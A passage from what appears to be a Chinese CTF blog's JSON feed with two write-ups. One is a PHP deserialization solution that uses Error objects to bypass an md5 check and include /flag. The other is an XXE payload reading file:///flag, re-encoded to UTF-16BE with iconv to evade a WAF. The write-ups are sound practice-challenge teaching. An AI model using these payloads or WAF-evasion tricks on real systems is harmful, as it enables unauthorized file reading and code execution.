punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>           <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>               <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Try Hard !!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>           <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>           </pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"?>&lt;?=include~\"</span><span class=\"token operator\">.</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%D0%99%93%9E%98\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"?>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SYCLOVER</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020%5DGreatphp/3.png\" alt=\"3\" /></p>\n<p>总结：<br />\nerror 原生类 __toString 方法的结果是相同的。 记住行号也需要一样，他们的值是不一样的，但是呢， 结果的 md5 值是一样的，从而可以绕过 。执行 eval 函数，eval include /flag。</p>\n<p>对 php 原生类 有了些许了解，但还需要继续学习。</p>\n",
            "tags": [
                "刷题笔记",
                "buuctf",
                "php原生类利用",
                "php反序列化",
                "md5()和sha1()对类进行hash 触发__toString方法"
            ]
        },
        {
            "id": "http://odiws.github.io/2024/07/25/2019-Web-Unagi/",
            "url": "http://odiws.github.io/2024/07/25/2019-Web-Unagi/",
            "title": "[CSAWQual2019]Web_Unagi",
            "date_published": "2024-07-25T11:42:26.000Z",
            "content_html": "<h2 id=\"csawqual2019web_unagi\"><a class=\"anchor\" href=\"#csawqual2019web_unagi\">#</a> [CSAWQual2019]Web_Unagi</h2>\n<p><img data-src=\"../images/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/1.png\" alt=\"1\" /></p>\n<p>提示需要上传 xml 文件，flag 在 /flag 中。很容易联想到 XXE 漏洞来读取。</p>\n<pre><code>&lt;?xml version='1.0'?&gt;\n&lt;!DOCTYPE users [\n&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;\n&lt;users&gt;\n    &lt;user&gt;\n        &lt;username&gt;gg&lt;/username&gt;\n        &lt;password&gt;passwd1&lt;/password&gt;\n        &lt;name&gt;ggg&lt;/name&gt;\n        &lt;email&gt;alice@fakesite.com&lt;/email&gt;  \n        &lt;group&gt;CSAW2019&lt;/group&gt;\n        &lt;intro&gt;&amp;xxe;&lt;/intro&gt;\n    &lt;/user&gt;\n    &lt;user&gt;\n        &lt;username&gt;bob&lt;/username&gt;\n        &lt;password&gt;passwd2&lt;/password&gt;\n        &lt;name&gt; Bob&lt;/name&gt;\n        &lt;email&gt;bob@fakesite.com&lt;/email&gt;  \n        &lt;group&gt;CSAW2019&lt;/group&gt;\n        &lt;intro&gt;&amp;xxe;&lt;/intro&gt;\n    &lt;/user&gt;\n&lt;/users&gt;\n</code></pre>\n<p>上传显示 <em>WAF blocked uploaded file. Please try again</em></p>\n<p>查了如何绕过 WAF 保护的 XXE 的资料：</p>\n<blockquote>\n<p>一个 xml 文档不仅可以用 UTF-8 编码，也可以用 UTF-16 (两个变体 - BE 和 LE)、UTF-32 (四个变体 - BE、LE、2143、3412) 和 EBCDIC 编码。</p>\n<p>在这种编码的帮助下，使用正则表达式可以很容易地绕过 WAF，因为在这种类型的 WAF 中，正则表达式通常仅配置为单字符集。</p>\n</blockquote>\n<p>用以下命令把上面的文本转为 16 进制：</p>\n<p>cat 1.xml <strong>|</strong> iconv -f UTF-8 -t UTF-16BE <strong>&gt;</strong> x16.xml</p>\n<p><img data-src=\"../images/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/2.png\" alt=\"2\" /></p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2hhd3Jvb3QuY2MvMTU2Lmh0bWw=\">https://www.shawroot.cc/156.html</span></p>\n",
            "tags": [
                "刷题笔记",
                "buuctf",
                "xml_upload"
            ]
        }
    ]
}